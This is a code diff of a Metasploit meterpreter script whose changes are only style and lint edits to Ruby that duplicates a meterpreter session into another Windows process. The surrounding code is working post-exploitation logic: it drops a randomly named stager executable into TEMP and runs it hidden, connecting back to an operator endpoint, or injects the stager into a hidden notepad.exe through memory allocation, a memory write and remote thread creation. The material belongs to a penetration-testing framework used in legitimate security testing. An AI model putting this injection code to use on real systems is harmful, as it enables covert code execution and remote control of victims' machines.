@@ -1,9 +1,9 @@
+# frozen_string_literal: true
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
 # If you'd like to imporve this script, please try to port it as a post
 # module instead. Thank you.
 ##
-
 
 # Author: Scriptjunkie
 # Uses a meterpreter session to spawn a new meterpreter session in a different process.
@@ -38,13 +38,13 @@ spawn = false
 autoconn = true
 inject   = true
 target_pid = nil
-target    = "notepad.exe"
-pay      = nil
+target = "notepad.exe"
+pay = nil
 
 #
 # Option parsing
 #
-opts.parse(args) do |opt, idx, val|
+opts.parse(args) do |opt, _idx, val|
   case opt
   when "-h"
     print_line(opts.usage)
@@ -89,7 +89,7 @@ if client.platform =~ /win32|win64/
 
   print_status("Current server process: #{server.name} (#{server.pid})")
 
-  if ! inject
+  if !inject
     exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
     print_status("Meterpreter stager executable #{exe.length} bytes long")
 
@@ -97,7 +97,7 @@ if client.platform =~ /win32|win64/
     # Upload to the filesystem
     #
     tempdir = client.sys.config.getenv('TEMP')
-    tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+    tempexe = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8) + 6)) + ".exe"
     tempexe.gsub!("\\\\", "\\")
 
     fd = client.fs.file.new(tempexe, "wb")
@@ -109,27 +109,25 @@ if client.platform =~ /win32|win64/
     # Execute the agent
     #
     print_status("Executing the agent with endpoint #{rhost}:#{rport}...")
-    pid = session.sys.process.execute(tempexe, nil, {'Hidden' => true})
-  elsif ! spawn
+    pid = session.sys.process.execute(tempexe, nil, 'Hidden' => true)
+  elsif !spawn
     # Get the target process name
     print_status("Duplicating into #{target}...")
 
     # Get the target process pid
-    if not target_pid
-      target_pid = client.sys.process[target]
-    end
+    target_pid = client.sys.process[target] unless target_pid
 
-    if not target_pid
+    unless target_pid
       print_error("Could not access the target process")
       print_status("Spawning a notepad.exe host process...")
-      note = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true })
+      note = client.sys.process.execute('notepad.exe', nil, 'Hidden' => true)
       target_pid = note.pid
     end
   else
     print_status("Spawning a #{target} host process...")
-    newproc = client.sys.process.execute(target, nil, {'Hidden' => true })
+    newproc = client.sys.process.execute(target, nil, 'Hidden' => true)
     target_pid = newproc.pid
-    if not target_pid
+    unless target_pid
       print_error("Could not create a process around #{target}")
       raise Rex::Script::Completed
     end
@@ -141,7 +139,7 @@ if client.platform =~ /win32|win64/
   raw = pay.generate
   mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
 
-  print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
+  print_status("Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager")
   print_status("Writing the stager into memory...")
   host_process.memory.write(mem, raw)
   host_process.thread.create(mem, 0)
